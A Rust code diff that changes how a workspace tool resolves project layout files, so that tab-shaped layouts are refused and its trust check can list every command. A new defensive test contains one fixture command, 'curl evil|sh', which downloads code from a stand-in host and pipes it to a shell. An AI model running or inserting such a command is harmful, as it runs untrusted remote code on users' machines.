@@ -556,19 +556,21 @@ pub fn resolve_origin(
         && let Ok(data) = serde_json::from_str::<Value>(text)
         && !data["layout"].is_null()
     {
-        return parse_tabs_value(&data["layout"])
-            .map(|(l, w)| (l, w, true))
+        // Project files stay on `panes[]`: `trust::Sources::commands` lists only those.
+        return parse_layout_value(&data["layout"])
+            .map(|l| (l.to_tabs(), Vec::new(), true))
             .map_err(|e| format!("{path}: layout: {e}"));
     }
     if let Some((path, text)) = legacy {
         let data: Value =
             serde_json::from_str(text).map_err(|_| format!("{path}: invalid JSON"))?;
-        let (layout, mut warnings) = parse_tabs_value(&data).map_err(|e| format!("{path}: {e}"))?;
+        let layout = parse_layout_value(&data).map_err(|e| format!("{path}: {e}"))?;
+        let mut warnings = Vec::new();
         warnings.push(format!(
             "{path} is deprecated; move it to \"layout\" in {}",
             crate::project::PROJECT_FILE
         ));
-        return Ok((layout, warnings, true));
+        return Ok((layout.to_tabs(), warnings, true));
     }
     Ok((
         config.cloned().unwrap_or_else(default_tabs),
@@ -814,14 +816,6 @@ mod tests {
     }
 
     #[test]
-    fn a_project_file_in_the_tab_shape_wins_over_config() {
-        let project = r#"{"layout":{"tabs":[{"name":"a"},{"name":"b"}]}}"#;
-        let config = cfg();
-        let names = tab_names(resolve(Some((PROJECT, project)), None, Some(&config)));
-        assert_eq!(names, vec![Some("a".to_owned()), Some("b".to_owned())]);
-    }
-
-    #[test]
     fn origin_is_the_project_for_repo_files_only() {
         let new = r#"{"layout":{"panes":[{"name":"n"}]}}"#;
         let old = r#"{"panes":[{"name":"o"}]}"#;
@@ -832,6 +826,16 @@ mod tests {
         // A project file without `layout` leaves the user layout in charge.
         assert!(!origin(Some((PROJECT, "{}")), None, Some(&config)));
         assert!(!origin(None, None, None));
+    }
+
+    #[test]
+    fn project_layouts_with_tabs_are_refused_so_trust_lists_every_command() {
+        let tabs = r#"{"tabs":[{"name":"x","command":"curl evil|sh"}]}"#;
+        let project = format!(r#"{{"layout":{tabs}}}"#);
+        let err = resolve_origin(Some((PROJECT, &project)), None, None).unwrap_err();
+        assert!(err.starts_with(PROJECT) && err.contains("panes"), "{err}");
+        let err = resolve_origin(None, Some((FILE, tabs)), None).unwrap_err();
+        assert!(err.starts_with(FILE) && err.contains("panes"), "{err}");
     }
 
     #[test]
